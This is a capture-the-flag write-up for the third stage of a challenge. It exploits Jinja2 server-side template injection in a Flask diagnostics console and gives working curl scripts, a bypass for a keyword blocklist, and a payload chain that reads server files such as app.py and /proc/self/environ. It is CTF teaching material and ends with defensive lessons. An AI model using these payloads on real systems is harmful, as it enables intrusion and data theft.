# Kepler's Office 3/5 — Diagnostics Report

**Flag:** `reentry{j1nj4_ss7i_burn3d_th3_0p3r4t0r}`

| | |
|---|---|
| Category | Web / SSTI (Jinja2) + blocklist bypass + file read via Python builtins |
| Target | the office terminal instance (offline now) |
| Prereq | operator session (`kepler:stardust`) + engineer token `ENG-7c1f9a4d` (stage 2) |
| Files | none |

> **Challenge brief:** With engineer scope, the console lets you save named seal-diagnostic report
> templates and render a saved one. Whatever the template evaluates to comes back on the page, so
> you can read the result straight off the report.

---

## Short version

1. `/diag` needs engineer scope → pass the token `ENG-7c1f9a4d`.
2. Save a template (`POST /diag action=create name tmpl`) and render it (`GET /report?id=N&token=`).
   The template is rendered with `render_template_string` → **SSTI (Jinja2)**.
3. `{{7*7}}` → `49`. `{{config}}` → leaks `SECRET_KEY`.
4. Blocklist `['__','import','os','popen','system','subprocess','eval','exec']` (substring, on
   `body.lower()`).
5. Bypass: build dunders with `\x5f\x5f`, access attributes with `|attr(...)`. Instead of
   `os/popen/system`, read files with the builtin **`open().read()`**.
6. Read `/opt/console/app.py` (no flag in code), then brute paths → **`/opt/console/flag3.txt`**.

---

## 1. Get engineer scope

```bash
export B="https://<your-instance>.chals.io"; export TK="ENG-7c1f9a4d"
curl -sk "$B/login" -c jar.txt --data-urlencode "username=kepler" --data-urlencode "password=stardust" >/dev/null
curl -sk "$B/diag?token=$TK" -b jar.txt | sed 's/<[^>]*>//g' | grep -iE 'engineer|template'
# Engineer scope OK. Save a reusable seal-diagnostic report, or render a saved one.
```

`POST /diag` (`action=create`, `name`, `tmpl`) saves a template; `GET /report?id=N&token=` renders.
Default reports are id 0,1,2; the first saved is id 3.

## 2. Confirm SSTI

```bash
ssti(){   # save as id=3 (fresh session) and render
  rm -f j.txt
  curl -sk "$B/login" -c j.txt --data-urlencode "username=kepler" --data-urlencode "password=stardust" >/dev/null
  curl -sk "$B/diag" -b j.txt -c j.txt --data-urlencode "token=$TK" --data-urlencode "action=create" --data-urlencode "name=x" --data-urlencode "tmpl=$1" >/dev/null
  curl -sk "$B/report?id=3&token=$TK" -b j.txt | sed -n 's/.*<pre[^>]*>\(.*\)<\/pre>.*/\1/p'
}
ssti 'RESULT={{7*7}}'     # RESULT=49   -> Jinja2 SSTI
ssti '{{config}}'         # leaks SECRET_KEY (useful for forging a Flask cookie, not needed here)
```

## 3. Map the blocklist

Denied (substring, case-insensitive): `__`, `import`, `os`, `popen`, `system`, `subprocess`,
`eval`, `exec`. Allowed: `class`, `globals`, `builtins`, `open`, `read`, `attr`, `getattr`, and the
escape `\x5f`.

## 4. Bypass: dunders via `\x5f`, read files with `open`

- Write `__` as `\x5f\x5f` in a string — the raw template has no literal `__`.
- Access attributes with the `|attr("...")` filter.
- No `os`/`popen` needed — read files with the `open` builtin from `__builtins__`.

Chain: `cycler.__init__.__globals__` → `__builtins__` (dict) → `open`:

```bash
GB='(cycler|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f"))|attr("get")("\x5f\x5fbuiltins\x5f\x5f")'
readf(){
  rm -f j.txt
  curl -sk "$B/login" -c j.txt --data-urlencode "username=kepler" --data-urlencode "password=stardust" >/dev/null
  P="{{ ${GB}|attr(\"get\")(\"open\")(\"$1\")|attr(\"read\")() }}"
  curl -sk "$B/diag" -b j.txt -c j.txt --data-urlencode "token=$TK" --data-urlencode "action=create" --data-urlencode "name=x" --data-urlencode "tmpl=$P" >/dev/null
  curl -sk "$B/report?id=3&token=$TK" -b j.txt
}
```

> **Traps:** saved templates live in the **signed Flask session cookie** (`MAX_COOKIE_SIZE=4093`),
> so re-login and render id=3 each time to avoid cookie bloat. File paths also go through the
> blocklist — `/etc/hostname` is rejected because "h**os**tname" contains `os`.

## 5. Find the flag

```bash
readf "/proc/self/environ" | tr '\0' '\n' | grep -iE 'CONSOLE|HOME'
# CONSOLE_DB=/opt/console/console.db ; HOME=/home/svc  -> app in /opt/console
readf "/opt/console/app.py" | grep -nE 'FLAG|DENY|ENG_TOKEN'
# DENY = ['__','import','os','popen','system','subprocess','eval','exec']
# FLAG1 = reentry{...}  (no FLAG3 in code -> it's in a file)
for f in /opt/console/flag3.txt /flag.txt /home/svc/flag.txt; do printf '%-28s ' "$f"; readf "$f" | grep -oiE "reentry\{[^}]*\}|No such file"; done
# /opt/console/flag3.txt -> reentry{j1nj4_ss7i_burn3d_th3_0p3r4t0r}
```

🚩 **Flag:** `reentry{j1nj4_ss7i_burn3d_th3_0p3r4t0r}`

> **Note:** The instance is offline now, so this cannot be re-run. The chain is self-consistent and
> continues into stage 4 (SSTI → RCE).

---

## Why it works / lessons

- `render_template_string` on user data = SSTI. A word blocklist is not enough — Jinja can build
  attribute names from strings (`\xNN`, `~`, `attr`, `|join`), so `__`/`os`/... are bypassed easily.
- Reading files needs no `os`/`popen` — the `open` builtin is enough. Use `SandboxedEnvironment`
  (better: do not render user templates), and do not put flags on the filesystem the web process
  can read.

> **Previous:** [2 - Reel Mirror](2%20-%20Reel%20Mirror.md) · **Next:** [4 - Root of the Matter](4%20-%20Root%20of%20the%20Matter.md)
